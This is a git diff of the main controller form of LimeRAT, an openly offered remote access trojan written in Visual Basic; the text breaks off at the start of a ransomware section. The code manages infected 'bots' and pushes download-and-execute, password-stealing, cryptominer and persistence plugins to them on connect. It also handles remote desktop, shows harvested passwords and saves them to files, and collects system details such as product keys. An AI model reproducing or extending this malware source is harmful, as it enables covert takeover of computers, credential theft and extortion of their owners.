@@ -1,9 +1,5 @@
 ﻿'##################################################################
-<<<<<<< HEAD
-'##        N Y A N   C A T  |||   Updated on Nov./27/2018        ##
-=======
-'##        N Y A N   C A T  |||   Updated on Sept/25/2018        ##
->>>>>>> parent of 19710ea... UPDATE v0.1.8.5C
+'##        N Y A N   C A T  |||   Updated on Oct./20/2018        ##
 '##################################################################
 '##                                                              ##
 '##                                                              ##
@@ -36,65 +32,47 @@
 '## I am not responsible For any actions caused by this software ##
 '##################################################################
 
-
 Imports Mono.Cecil
 Imports Mono.Cecil.Cil
 
 Public Class Main
 
-    Public S As S_TcpListener
-    Public C As S_Client
+    Public WithEvents S As S_TcpListener
+    Public Event Connected(ByVal sock As Integer)
     Public SPL = S_Settings.SPL
+
 
 #Region "Form Events"
 
     Private Sub Main_Load(sender As Object, e As EventArgs) Handles MyBase.Load
         CheckForIllegalCrossThreadCalls = False
-        S_Messages.M = Me
         ' MetroLabel3.Text = Nothing
         Try : PingClients.Interval = My.Settings.PING_VALUE * 1000 : Catch : End Try
         Try : My.Computer.Audio.Play(My.Resources.Intro, AudioPlayMode.Background) : Catch : End Try 'https://freesound.org/people/eardeer/sounds/385281/
 
         Try
-            Dim xDoc As XElement = XElement.Load("Misc/USERS.xml")
-            For Each item As XElement In xDoc...<Item>
-                Dim lvItem As New ListViewItem(item...<LOC>.Value, 0)
-                lvItem.SubItems.Add(item...<IP>.Value)
-                lvItem.SubItems.Add(item...<ID>.Value)
-                lvItem.SubItems.Add(item...<USER>.Value)
-                lvItem.SubItems.Add(item...<VERSION>.Value)
-                lvItem.SubItems.Add(item...<OS>.Value)
-                lvItem.SubItems.Add(item...<INSTALL>.Value)
-                lvItem.SubItems.Add(item...<AV>.Value)
-                lvItem.SubItems.Add(item...<RANS>.Value)
-                lvItem.SubItems.Add(item...<XMR>.Value)
-                lvItem.SubItems.Add(item...<SP>.Value)
-                lvItem.SubItems.Add(item...<PORT>.Value)
-                lvItem.SubItems.Add(item...<DEP>.Value)
-                lvItem.SubItems.Add(item...<PING>.Value)
-                lvItem.SubItems.Add(item...<NOTE>.Value)
-                lvItem.ForeColor = Color.Red
-                L1.Items.AddRange(New ListViewItem() {lvItem})
-            Next
-            L1.AutoResizeColumns(ColumnHeaderAutoResizeStyle.HeaderSize)
+            If IO.File.Exists("MISC/USERS.dat") Then
+                Dim BotList() As String = IO.File.ReadAllLines("MISC/USERS.dat")
+                If BotList.Contains("<<#>>") Then
+                    For Each line As String In BotList
+                        Dim lineArray() As String = Split(line, "<<#>>")
+                        Dim bot = L1.Items.Add(lineArray(0))
+                        bot.ForeColor = Color.Red
+                        For i As Integer = 1 To lineArray.Length - 1
+                            bot.SubItems.Add(lineArray(i))
+                        Next
+                    Next
+                    L1.AutoResizeColumns(ColumnHeaderAutoResizeStyle.HeaderSize)
+                End If
+            End If
         Catch ex As Exception
         End Try
 
         Try
-            AddHandler S_Client.Read, AddressOf S_Messages.Read
-            For Each x In S_Settings.PORT.ToList
-                S = New S_TcpListener
-                Dim T As New Threading.Thread(AddressOf S.Start)
-                T.Start(x)
-            Next
+            S = New S_TcpListener(S_Settings.PORT)
         Catch ex As Exception
             MsgBox(ex.Message)
             End
-        End Try
-
-        Try
-            Main_Rightclick.Renderer = New MyRenderer()
-        Catch ex As Exception
         End Try
 
         BackgroundWorker1.RunWorkerAsync()
@@ -102,42 +80,19 @@ Public Class Main
     End Sub
 
     Private Sub Main_FormClosing(sender As Object, e As FormClosingEventArgs) Handles Me.FormClosing
-
-        Try
-            If L1.Items.Count > 0 Then
-                Dim lviList As New List(Of ListViewItem)
-                For Each item As ListViewItem In L1.Items
-                    lviList.Add(item)
-                Next
-                Dim xDoc As XElement =
-                            <Items>
-                                <%= From lvi As ListViewItem In lviList Select
-                                    <Item>
-                                        <LOC><%= lvi.Text %></LOC>
-                                        <IP><%= lvi.SubItems(1).Text %></IP>
-                                        <ID><%= lvi.SubItems(2).Text %></ID>
-                                        <USER><%= lvi.SubItems(3).Text %></USER>
-                                        <VERSION><%= lvi.SubItems(4).Text %></VERSION>
-                                        <OS><%= lvi.SubItems(5).Text %></OS>
-                                        <INSTALL><%= lvi.SubItems(6).Text %></INSTALL>
-                                        <AV><%= lvi.SubItems(7).Text %></AV>
-                                        <RANS><%= lvi.SubItems(8).Text %></RANS>
-                                        <XMR><%= lvi.SubItems(9).Text %></XMR>
-                                        <SP><%= lvi.SubItems(10).Text %></SP>
-                                        <PORT><%= lvi.SubItems(11).Text %></PORT>
-                                        <DEP><%= lvi.SubItems(12).Text %></DEP>
-                                        <PING><%= "Offline" %></PING>
-                                        <NOTE><%= lvi.SubItems(14).Text %></NOTE>
-                                    </Item> %>
-                            </Items>
-
-                xDoc.Save("MISC/USERS.xml")
-            End If
-        Catch ex As Exception
-        End Try
-
         My.Settings.Save()
 
+        Try
+            Dim myWriter As New IO.StreamWriter("MISC/USERS.dat")
+            Dim SPL As String = "<<#>>"
+            For Each x As ListViewItem In L1.Items
+                myWriter.WriteLine(x.Text & SPL & x.SubItems(1).Text & SPL & x.SubItems(2).Text & SPL _
+                                   & x.SubItems(3).Text & SPL & x.SubItems(4).Text & SPL & x.SubItems(5).Text & SPL & x.SubItems(6).Text & SPL _
+                                   & x.SubItems(7).Text & SPL & x.SubItems(8).Text & SPL & x.SubItems(9).Text & SPL & x.SubItems(10).Text & SPL & x.SubItems(11).Text & SPL & "Offline" & SPL & x.SubItems(12).Text)
+            Next
+            myWriter.Close()
+        Catch ex As Exception
+        End Try
 
         Try
             NotifyIcon1.Dispose()
@@ -147,13 +102,15 @@ Public Class Main
     End Sub
 
     Private Sub BackgroundWorker1_DoWork(sender As Object, e As System.ComponentModel.DoWorkEventArgs) Handles BackgroundWorker1.DoWork
+        Main_Rightclick.Renderer = New MyRenderer()
+
         Try
             Using WC As New Net.WebClient()
                 Dim reply As String = WC.DownloadString("https://pastebin.com/raw/9kHA6nwH")
                 If reply <> S_Settings.StubVer Then
-                    S_Messages.Messages("{ New update is available! }", "github.com/NYAN-x-CAT/Lime-RAT/releases")
+                    Messages("{ New update is available! }", "github.com/NYAN-x-CAT/Lime-RAT/releases")
                 ElseIf reply = S_Settings.StubVer Then
-                    S_Messages.Messages("{ You are using the latest version! }", "Found bug? github.com/NYAN-x-CAT/Lime-RAT/issues/new")
+                    Messages("{ You are using the latest version! }", "Found bug? Email NYANxCAT@pm.me")
                 End If
                 WC.Dispose()
             End Using
@@ -181,7 +138,7 @@ Public Class Main
                 PortLabel.Append(String.Format(" {0}=CLOSED ", ThePort))
                 MetroLabel3.Text = String.Format("IP={0}  {1}  KEY={2}", GetExternalAddress, PortLabel.ToString, S_Settings.EncryptionKey)
                 MetroLabel3.ForeColor = Color.Red
-                'Try : My.Computer.Audio.Play(My.Resources._Error, AudioPlayMode.Background) : Catch : End Try 'https://freesound.org/people/eardeer/sounds/385281/
+                Try : My.Computer.Audio.Play(Application.StartupPath + "\Misc\Error.wav", AudioPlayMode.Background) : Catch : End Try 'https://freesound.org/people/eardeer/sounds/385281/
 
                 If GTV("FW") = Nothing Then
                     Dim result As DialogResult = MessageBox.Show("Port " & ThePort & " seems to be blocked" + Environment.NewLine + "Do you want to add LimeRAT into firewall exception", "", MessageBoxButtons.YesNo)
@@ -214,6 +171,31 @@ Public Class Main
 
 
 #Region "Server Events"
+    Private Sub S_Disconnected(ByVal u As Integer) Handles S.DisConnected
+        SyncLock L1.Items
+            Try
+                For i As Integer = 0 To L1.Items.Count - 1
+                    If L1.Items(i).Tag = u Then
+                        L1.Items(i).ForeColor = Color.Red
+                        L1.Items(i).SubItems(PING.Index).Text = "Offline"
+                        L1.Items(i).Tag = Nothing
+                        L1.AutoResizeColumns(ColumnHeaderAutoResizeStyle.HeaderSize)
+                        Messages("{" + S.IP(u) + "}", "Disconnected")
+                        Exit For
+                    End If
+                Next
+            Catch ex As Exception
+            End Try
+        End SyncLock
+    End Sub
+
+    Private Sub Dicconnction_Tick(sender As Object, e As EventArgs) Handles Dicconnction.Tick
+        For Each x As ListViewItem In L1.Items
+            If x.SubItems(PING.Index).Text = "Offline" Then
+                x.Remove()
+            End If
+        Next
+    End Sub
 
     Public List_PWD As New List(Of String)
     Public List_DE As New List(Of String)
@@ -225,61 +207,927 @@ Public Class Main
     Public _MINER_SETTINGS As String = ""
     Public CHK_MINER As Boolean = False
     Public CHK_PERS As Boolean = False
+    Private Sub S_Connected(ByVal u As Integer) Handles Me.Connected
+        Try
+
+            Messages("{" + S.IP(u) + "}", "Connected")
+
+            If CHK_DE AndAlso IO.File.Exists(PathEXE) AndAlso Not List_DE.Contains(S.IP(u)) Then
+                Dim MS As New IO.MemoryStream
+                Dim PLG = Convert.ToBase64String(GZip(IO.File.ReadAllBytes(Application.StartupPath & "\Misc\Plugins\MISC.dll"), True))
+                Dim F = Convert.ToBase64String(GZip(IO.File.ReadAllBytes(PathEXE), True))
+                Dim CMD = SB(S_Encryption.AES_Encrypt("IPLM" + SPL + PLG + SPL + "RD-|'P'|" + IO.Path.GetFileName(PathEXE) + "|'P'|" + F))
+                MS.Write(CMD, 0, CMD.Length)
+                S.SendData(u, MS.ToArray)
+                MS.Dispose()
+                List_DE.Add(S.IP(u))
+                Messages(S.IP(u), "On Connect: Download and Execute " + IO.Path.GetFileName(PathEXE))
+            End If
+
+            If CHK_PWD = True AndAlso Not List_PWD.Contains(S.IP(u)) Then
+                S.Send(u, "CPL" + SPL + getMD5Hash(IO.File.ReadAllBytes(Application.StartupPath & "\Misc\Plugins\PWD.dll")))
+                List_PWD.Add(S.IP(u))
+                Messages(S.IP(u), "On Connect: PWD")
+            End If
+
+            If CHK_MINER = True AndAlso Not List_MINER.Contains(S.IP(u)) Then
+                S.Send(u, _MINER_SETTINGS)
+                List_MINER.Add(S.IP(u))
+                Messages(S.IP(u), "On Connect: MINER")
+            End If
+
+            If CHK_PERS = True AndAlso Not List_PERS.Contains(S.IP(u)) Then
+                S.Send(u, "IPLM" + SPL + Convert.ToBase64String(GZip(IO.File.ReadAllBytes(Application.StartupPath & "\Misc\Plugins\PERS.dll"), True)) + SPL + " ")
+                List_PERS.Add(S.IP(u))
+                Messages(S.IP(u), "On Connect: Persistence")
+            End If
+
+        Catch ex As Exception
+            Messages(S.IP(u), ex.Message)
+        End Try
+    End Sub
+
+
 
 #End Region
 
+
+#Region "Client Commands"
+    Private Shared _Gio As New S_GeoIP(Application.StartupPath & "\Misc\GeoIP.dat")
+    Delegate Sub _Data(ByVal u As Integer, ByVal B As Byte())
+    Sub Data(ByVal u As Integer, ByVal B As Byte()) Handles S.Data
+
+        Dim A As String() = Split(S_Encryption.AES_Decrypt(BS(B)), S_Settings.SPL)
+        Try
+            Select Case A(0)
+
+#Region "Add to L1"
+
+                Case "info"
+                    If Me.InvokeRequired Then
+                        Me.Invoke(New _Data(AddressOf Data), u, B)
+                        Exit Sub
+                    End If
+                    SyncLock L1.Items
+                        For i As Integer = 0 To L1.Items.Count - 1
+                            If L1.Items(i).SubItems(ID.Index).Text = A(1) AndAlso L1.Items(i).SubItems(USERN.Index).Text = A(2) Then
+                                L1.Items(i).Tag = u
+                                L1.Items(i).ImageKey = _Gio.LookupCountryCode(S.IP(u)) & ".png"
+                                L1.Items(i).SubItems(IP.Index).Text = S.IP(u)
+                                L1.Items(i).SubItems(ID.Index).Text = A(1)
+                                L1.Items(i).SubItems(USERN.Index).Text = A(2)
+                                L1.Items(i).SubItems(VER.Index).Text = A(3)
+                                L1.Items(i).SubItems(OS.Index).Text = A(4)
+                                L1.Items(i).SubItems(INSDATE.Index).Text = A(5)
+                                L1.Items(i).SubItems(AV.Index).Text = A(6)
+                                L1.Items(i).SubItems(RANS.Index).Text = A(7)
+                                L1.Items(i).SubItems(XMR.Index).Text = A(8)
+                                L1.Items(i).SubItems(SP.Index).Text = A(9)
+                                L1.Items(i).SubItems(_PORT.Index).Text = A(10)
+                                L1.Items(i).SubItems(DotNET.Index).Text = A(11)
+                                L1.Items(i).SubItems(PING.Index).Text = "Online"
+                                L1.Items(i).ForeColor = Nothing
+                                L1.Items(i).ToolTipText = String.Format("Administrator {0}" + Environment.NewLine + "Full Path {1}", A(14), A(15))
+                                Messages("{" + S.IP(u) + "}", "Reconnected")
+
+                                Try
+                                    If GTV(L1.Items(i).SubItems(ID.Index).Text + "_" + L1.Items(i).SubItems(USERN.Index).Text + " Color") IsNot Nothing Then
+                                        L1.Items(i).ForeColor = ColorTranslator.FromHtml(GTV(L1.Items(i).SubItems(ID.Index).Text + "_" + L1.Items(i).SubItems(USERN.Index).Text + " Color"))
+                                    End If
+
+                                    If GTV(L1.Items(i).SubItems(ID.Index).Text + "_" + L1.Items(i).SubItems(USERN.Index).Text + " Note") IsNot Nothing Then
+                                        L1.Items(i).SubItems(NOTE_.Index).Text = GTV(L1.Items(i).SubItems(ID.Index).Text + "_" + L1.Items(i).SubItems(USERN.Index).Text + " Note")
+                                    End If
+                                Catch ex As Exception
+                                End Try
+                                L1.AutoResizeColumns(ColumnHeaderAutoResizeStyle.HeaderSize)
+                                Exit Select
+                            End If
+                        Next
+
+                        ''''
+
+                        Dim L = L1.Items.Add(_Gio.LookupCountryName(S.IP(u)), _Gio.LookupCountryCode(S.IP(u)) & ".png")
+                        L.Tag = u
+                        Try : L.ToolTipText = String.Format("Administrator {0}" + Environment.NewLine + "Full Path {1}", A(14), A(15)) : Catch : End Try
+                        L.SubItems.Add(S.IP(u))
+
+                        For i As Integer = 1 To A.Length - 1
+                            If i = 15 Then Exit For
+                            L.SubItems.Add(A(i))
+                        Next
+
+                        Try
+                            If GTV(L.SubItems(ID.Index).Text + "_" + L.SubItems(USERN.Index).Text + " Color") IsNot Nothing Then
+                                L.ForeColor = ColorTranslator.FromHtml(GTV(L.SubItems(ID.Index).Text + "_" + L.SubItems(USERN.Index).Text + " Color"))
+                            End If
+
+                            If GTV(L.SubItems(ID.Index).Text + "_" + L.SubItems(USERN.Index).Text + " Note") IsNot Nothing Then
+                                L.SubItems(NOTE_.Index).Text = GTV(L.SubItems(ID.Index).Text + "_" + L.SubItems(USERN.Index).Text + " Note")
+                            End If
+                        Catch ex As Exception
+                        End Try
+
+                        L1.AutoResizeColumns(ColumnHeaderAutoResizeStyle.HeaderSize)
+
+                        If MetroToggle1.Checked = True Then
+                            NotifyIcon1.BalloonTipIcon = ToolTipIcon.None
+                            NotifyIcon1.BalloonTipText = "User: " + A(2) + vbNewLine + "IP: " + S.IP(u)
+                            NotifyIcon1.BalloonTipTitle = "LimeRAT | New Connection!"
+                            NotifyIcon1.ShowBalloonTip(600)
+                        End If
+                    End SyncLock
+                    RaiseEvent Connected(u)
+                    Exit Select
+
+#End Region
+
+#Region "Update L1"
+
+                Case "!PStart"
+                    S.Send(u, "!P")
+
+                Case "!P"
+                    If Me.InvokeRequired Then
+                        Me.Invoke(New _Data(AddressOf Data), u, B)
+                        Exit Sub
+                    End If
+                    SyncLock L1.Items
+                        For i As Integer = 0 To L1.Items.Count - 1
+                            If L1.Items.Item(i).SubItems(ID.Index).Text.ToString = A(2).ToString AndAlso L1.Items.Item(i).SubItems(USERN.Index).Text.ToString = A(3).ToString Then
+                                L1.Items.Item(i).SubItems(PING.Index).Text = A(1).ToString
+                                Exit For
+                            End If
+                        Next
+                        L1.AutoResizeColumns(ColumnHeaderAutoResizeStyle.HeaderSize)
+                    End SyncLock
+                    Exit Select
+
+
+                Case "!R"
+                    If Me.InvokeRequired Then
+                        Me.Invoke(New _Data(AddressOf Data), u, B)
+                        Exit Sub
+                    End If
+                    SyncLock L1.Items
+                        For i As Integer = 0 To L1.Items.Count - 1
+                            If L1.Items.Item(i).SubItems(ID.Index).Text.ToString = A(2).ToString AndAlso L1.Items.Item(i).SubItems(USERN.Index).Text.ToString = A(3).ToString Then
+                                L1.Items.Item(i).SubItems(RANS.Index).Text = A(1).ToString
+                                Exit For
+                            End If
+                        Next
+                        L1.AutoResizeColumns(ColumnHeaderAutoResizeStyle.HeaderSize)
+                    End SyncLock
+                    Exit Select
+
+                Case "!SP"
+                    If Me.InvokeRequired Then
+                        Me.Invoke(New _Data(AddressOf Data), u, B)
+                        Exit Sub
+                    End If
+                    SyncLock L1.Items
+                        For i As Integer = 0 To L1.Items.Count - 1
+                            If L1.Items.Item(i).SubItems(ID.Index).Text.ToString = A(2).ToString AndAlso L1.Items.Item(i).SubItems(USERN.Index).Text.ToString = A(3).ToString Then
+                                If A(1).ToString.Contains("Spreaded!") Then
+                                    L1.Items.Item(i).BackColor = Color.DarkGreen
+                                    L1.Items.Item(i).SubItems(SP.Index).Text = "Just Spreaded!"
+                                Else
+                                    L1.Items.Item(i).SubItems(SP.Index).Text = A(1).ToString
+                                End If
+                                Exit For
+                            End If
+                        Next
+                        L1.AutoResizeColumns(ColumnHeaderAutoResizeStyle.HeaderSize)
+                    End SyncLock
+                    Exit Select
+
+                Case "!X"
+                    If Me.InvokeRequired Then
+                        Me.Invoke(New _Data(AddressOf Data), u, B)
+                        Exit Sub
+                    End If
+                    SyncLock L1.Items
+                        For i As Integer = 0 To L1.Items.Count - 1
+                            If L1.Items.Item(i).SubItems(ID.Index).Text.ToString = A(2).ToString AndAlso L1.Items.Item(i).SubItems(USERN.Index).Text.ToString = A(3).ToString Then
+                                L1.Items.Item(i).SubItems(XMR.Index).Text = A(1).ToString
+                                Exit For
+                            End If
+                        Next
+                        L1.AutoResizeColumns(ColumnHeaderAutoResizeStyle.HeaderSize)
+                    End SyncLock
+                    Exit Select
+
+                Case "OK"
+                    If Me.InvokeRequired Then
+                        Me.Invoke(New _Data(AddressOf Data), u, B)
+                        Exit Sub
+                    End If
+
+                    SyncLock L1.Items
+                        For i As Integer = 0 To L1.Items.Count - 1
+                            If L1.Items.Item(i).SubItems(ID.Index).Text.ToString = A(1).ToString AndAlso L1.Items.Item(i).SubItems(USERN.Index).Text.ToString = A(2).ToString Then
+                                L1.Items.Item(i).BackColor = Nothing
+                                Exit For
+                            End If
+                        Next
+                    End SyncLock
+                    Exit Select
+
+#End Region
+
+#Region "Remote Desktop"
+
+                Case "!" ' i recive size of client screen
+                    ' lets start Cap form and start capture desktop
+                    If Me.InvokeRequired Then
+                        Me.Invoke(New _Data(AddressOf Data), u, B)
+                        Exit Sub
+                    End If
+
+                    Dim _RDP As Remote_Desktop = My.Application.OpenForms("!" + A(1))
+
+                    If _RDP Is Nothing Then
+                        _RDP = New Remote_Desktop
+                        _RDP.M = Me
+                        _RDP.U = u
+                        _RDP.Name = "!" + A(1)
+                        _RDP.Sz = New Size(A(2), A(3))
+                        _RDP.Text = "Remote Desktop - " & S.IP(u)
+                        _RDP.BOT = A(1)
+                        _RDP.Show()
+                    End If
+                    Exit Select
+
+                Case "@" ' i recive image  
+                    If Me.InvokeRequired Then
+                        Me.Invoke(New _Data(AddressOf Data), u, B)
+                        Exit Sub
+                    End If
+                    Dim _RDP As Remote_Desktop = My.Application.OpenForms("!" + A(1))
+                    If _RDP IsNot Nothing Then
+                        If A(2).Length = 1 Then
+                            If _RDP.MetroButton1.Text = "Stop" Then
+                                S.Send(u, "@" & SPL & _RDP.Combo_size.SelectedIndex & SPL & _RDP.C2 & SPL & _RDP.Combo_quality.SelectedItem)
+                            End If
+                            Exit Sub
+                        End If
+                        _RDP.PktToImage(System.Text.Encoding.Default.GetBytes(A(2)))
+                    End If
+                    Exit Select
+#End Region
+
+#Region "Password Recovery"
+
+                Case "PWD+"
+
+                    If Me.InvokeRequired Then
+                        Me.Invoke(New _Data(AddressOf Data), u, B)
+                        Exit Sub
+                    End If
+
+                    Dim Pass As Pass_Recovery = My.Application.OpenForms("PWD")
+                    If Pass Is Nothing AndAlso PW_F = True Then
+                        Pass = New Pass_Recovery
+                        Pass.M = Me
+                        Pass.U = u
+                        Pass.Name = "PWD"
+                        Pass.Text = " Passwords"
+                        Pass.Show()
+                    End If
+
+                    'duplicate 
+                    Try
+                        For Each listItem As ListViewItem In Pass.L1.Items
+                            If listItem.SubItems.Item(0).Text.TrimStart.TrimEnd = A(2) Then
+                                Exit Select
+                            End If
+                        Next
+                    Catch ex As Exception
+                    End Try
+
+                    Try
+                        Dim aa As String() = Split(A(1), "~|~")
+                        For i = 2 To aa.Length
+                            Dim ii As New ListViewItem
+                            ii.Text = aa(i)
+                            ii.SubItems.Add(aa(i + 2))
+                            ii.SubItems.Add(aa(i + 4))
+                            ii.SubItems.Add(aa(i + 6))
+                            ii.SubItems.Add(aa(i + 8))
+                            Pass.L1.Items.Add(ii)
+                            i += 9
+                        Next
+                    Catch ex As Exception
+                    End Try
+
+                    IO.File.WriteAllText(uFolder(A(2), "PASS.txt"), A(1))
+                    Exit Select
+#End Region
+
+#Region "System Manager"
+
+                Case "SysInfo"
+                    If Me.InvokeRequired Then
+                        Me.Invoke(New _Data(AddressOf Data), u, B)
+                        Exit Sub
+                    End If
+
+                    Dim sys As System_Manager = My.Application.OpenForms("Info" + A(20))
+                    If sys Is Nothing Then
+                        sys = New System_Manager
+                        sys.M = Me
+                        sys.U = u
+                        sys.Name = "Info" + A(20)
+                        sys.Text = "System Manager " + S.IP(u)
+                        sys.Show()
+                    End If
+
+                    Dim GW As New ListViewGroup("Windows", HorizontalAlignment.Left)
+                    Dim GU As New ListViewGroup("User", HorizontalAlignment.Left)
+                    Dim GS As New ListViewGroup("Specifications", HorizontalAlignment.Left)
+                    Dim GL As New ListViewGroup("Client", HorizontalAlignment.Left)
+                    Dim GM As New ListViewGroup("MISC", HorizontalAlignment.Left)
+
+                    Try
+                        With sys.ListView1
+                            .Clear()
+                            .FullRowSelect = True
+                            .View = View.Details
+                            .Columns.Add("")
+                            .Columns.Add("")
+                            .HeaderStyle = ColumnHeaderStyle.None
+
+                            .Groups.Add(GU)
+                            .Groups.Add(GW)
+                            .Groups.Add(GS)
+                            .Groups.Add(GL)
+                            .Groups.Add(GM)
+                        End With
+                    Catch ex As Exception
+                    End Try
+
+                    With sys.ListView1.Items
+                        .Add(New ListViewItem("Computer Name: ", GU)).SubItems.Add(A(1))
+
+                        .Add(New ListViewItem("User Name: ", GU)).SubItems.Add(A(2))
+                        .Add(New ListViewItem("Client ID: ", GU)).SubItems.Add(A(20))
+
+
+                        .Add(New ListViewItem("Windows Name: ", GW)).SubItems.Add(A(4))
+                        .Add(New ListViewItem("Windows Version: ", GW)).SubItems.Add(A(5))
+                        .Add(New ListViewItem("Windows Architecture: ", GW)).SubItems.Add(A(6))
+                        .Add(New ListViewItem("Product Key: ", GW)).SubItems.Add(A(7))
+
+
+                        .Add(New ListViewItem("Machine Type: ", GS)).SubItems.Add(A(17))
+                        .Add(New ListViewItem("DotNET Framework: ", GS)).SubItems.Add(A(18))
+                        .Add(New ListViewItem("CPU Name: ", GS)).SubItems.Add(A(8))
+                        .Add(New ListViewItem("GPU Name: ", GS)).SubItems.Add(A(9))
+                        .Add(New ListViewItem("RAM: ", GS)).SubItems.Add(A(10))
+                        .Add(New ListViewItem("Screen: ", GS)).SubItems.Add(A(11))
+                        .Add(New ListViewItem("Fixed Drivers: ", GS)).SubItems.Add(A(19))
+                        .Add(New ListViewItem("Removable Drivers: ", GS)).SubItems.Add(A(23))
+
+                        .Add(New ListViewItem("Pastebin URL: ", GL)).SubItems.Add(A(24))
+                        .Add(New ListViewItem("HOST: ", GL)).SubItems.Add(A(12))
+                        .Add(New ListViewItem("PORT: ", GL)).SubItems.Add(A(13))
+                        .Add(New ListViewItem("Privilege: ", GL)).SubItems.Add(A(3))
+                        .Add(New ListViewItem("Location: ", GL)).SubItems.Add(A(14))
+
+                        .Add(New ListViewItem("Active Window: ", GM)).SubItems.Add("{ " & A(21) & " }")
+                        .Add(New ListViewItem("Last Reboot: ", GM)).SubItems.Add(A(15))
+                        .Add(New ListViewItem("Anti-Virus: ", GM)).SubItems.Add(A(16))
+                        .Add(New ListViewItem("Firewall: ", GM)).SubItems.Add(A(22))
+                    End With
+
+                    sys.ListView1.AutoResizeColumns(ColumnHeaderAutoResizeStyle.HeaderSize)
+                    Exit Select
+
+                Case "PROC"
+                    If Me.InvokeRequired Then
+                        Me.Invoke(New _Data(AddressOf Data), u, B)
+                        Exit Sub
+                    End If
+                    Dim sys As System_Manager = My.Application.OpenForms("Info" + A(3))
+                    If sys IsNot Nothing Then
+
+                        Try
+                            With sys.L2
+                                .Clear()
+                                .View = View.Details
+                                .Columns.Add("Process name", 250)
+                                .Columns.Add("Process ID", 80)
+                                .Columns.Add("Process path", 250)
+                                .GridLines = True
+                            End With
+                        Catch ex As Exception
+                        End Try
+
+                        Try
+                            Dim PR As String() = Split(A(1), "|'P'|")
+                            For i As Integer = 0 To PR.Length
+                                With sys.L2.Items.Add(PR(i))
+                                    .SubItems.Add(PR(i + 1))
+                                    .SubItems.Add(PR(i + 2))
+                                    i += 2
+                                End With
+                            Next
+                        Catch ex1 As Exception
+                        End Try
+
+                        Try
+                            For Each x As ListViewItem In sys.L2.Items
+                                If x.SubItems(2).Text = A(2) Then
+                                    x.ForeColor = Color.FromArgb(142, 188, 0)
+                                End If
+                            Next
+                        Catch ex2 As Exception
+                        End Try
+                    End If
+
+                    sys.L2.AutoResizeColumns(ColumnHeaderAutoResizeStyle.HeaderSize)
+                    Exit Select
+
+                Case "STUP"
+                    If Me.InvokeRequired Then
+                        Me.Invoke(New _Data(AddressOf Data), u, B)
+                        Exit Sub
+                    End If
+                    Dim sys As System_Manager = My.Application.OpenForms("Info" + A(9))
+                    If sys IsNot Nothing Then
+                        Dim G1 As New ListViewGroup("HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run\", HorizontalAlignment.Left)
+                        Dim G2 As New ListViewGroup("HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunOnce\", HorizontalAlignment.Left)
+                        Dim G3 As New ListViewGroup("HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run\", HorizontalAlignment.Left)
+                        Dim G4 As New ListViewGroup("HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run\", HorizontalAlignment.Left)
+                        Dim G8 As New ListViewGroup("HKEY_LOCAL_MACHINE\Software\WOW6432Node\Microsoft\Windows\CurrentVersion\Run\", HorizontalAlignment.Left)
+                        Dim G6 As New ListViewGroup("HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce", HorizontalAlignment.Left)
+                        Dim G5 As New ListViewGroup("HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run", HorizontalAlignment.Left)
+                        Dim G7 As New ListViewGroup("Startup Folder", HorizontalAlignment.Left)
+
+                        Try
+                            With sys.L3
+                                .Clear()
+                                .View = View.Details
+                                .HeaderStyle = ColumnHeaderStyle.None
+                                .Columns.Add("")
+                                .Columns.Add("")
+                                .GridLines = True
+                                .Groups.Add(G1)
+                                .Groups.Add(G2)
+                                .Groups.Add(G3)
+                                .Groups.Add(G4)
+                                .Groups.Add(G8)
+                                .Groups.Add(G6)
+                                .Groups.Add(G5)
+                                .Groups.Add(G7)
+                                .ShowGroups = True
+                                .FullRowSelect = True
+                            End With
+                        Catch ex As Exception
+                        End Try
+
+                        Try
+                            Dim ST As String() = Split(A(1), "|'P'|")
+                            For i As Integer = 0 To ST.Length
+                                With sys.L3.Items
+                                    .Add(New ListViewItem(ST(i), G1)).SubItems.Add(ST(i + 1))
+                                    i += 1
+                                End With
+                            Next
+                        Catch ex As Exception
+                        End Try
+
+                        Try
+                            Dim ST As String() = Split(A(2), "|'P'|")
+                            For i As Integer = 0 To ST.Length
+                                With sys.L3.Items
+                                    .Add(New ListViewItem(ST(i), G2)).SubItems.Add(ST(i + 1))
+                                    i += 1
+                                End With
+                            Next
+                        Catch ex As Exception
+                        End Try
+
+                        Try
+                            Dim ST As String() = Split(A(3), "|'P'|")
+                            For i As Integer = 0 To ST.Length
+                                With sys.L3.Items
+                                    .Add(New ListViewItem(ST(i), G3)).SubItems.Add(ST(i + 1))
+                                    i += 1
+                                End With
+                            Next
+                        Catch ex As Exception
+                        End Try
+
+                        Try
+                            Dim ST As String() = Split(A(4), "|'P'|")
+                            For i As Integer = 0 To ST.Length
+                                With sys.L3.Items
+                                    .Add(New ListViewItem(ST(i), G4)).SubItems.Add(ST(i + 1))
+                                    i += 1
+                                End With
+                            Next
+                        Catch ex As Exception
+                        End Try
+
+                        Try
+                            Dim ST As String() = Split(A(8), "|'P'|")
+                            For i As Integer = 0 To ST.Length
+                                With sys.L3.Items
+                                    .Add(New ListViewItem(ST(i), G8)).SubItems.Add(ST(i + 1))
+                                    i += 1
+                                End With
+                            Next
+                        Catch ex As Exception
+                        End Try
+
+                        Try
+                            Dim ST As String() = Split(A(6), "|'P'|")
+                            For i As Integer = 0 To ST.Length
+                                With sys.L3.Items
+                                    .Add(New ListViewItem(ST(i), G6)).SubItems.Add(ST(i + 1))
+                                    i += 1
+                                End With
+                            Next
+                        Catch ex As Exception
+                        End Try
+
+                        Try
+                            Dim ST As String() = Split(A(5), "|'P'|")
+                            For i As Integer = 0 To ST.Length
+                                With sys.L3.Items
+                                    .Add(New ListViewItem(ST(i), G5)).SubItems.Add(ST(i + 1))
+                                    i += 1
+                                End With
+                            Next
+                        Catch ex As Exception
+                        End Try
+
+                        Try
+                            Dim ST As String() = Split(A(7), "|'P'|")
+                            For i As Integer = 0 To ST.Length
+                                With sys.L3.Items
+                                    .Add(New ListViewItem(ST(i), G7)).SubItems.Add(ST(i + 1))
+                                    i += 1
+                                End With
+                            Next
+                        Catch ex As Exception
+                        End Try
+
+                        sys.L3.AutoResizeColumns(ColumnHeaderAutoResizeStyle.HeaderSize)
+                    End If
+                    Exit Select
+
+#End Region
+
+#Region "Ransomware"
+
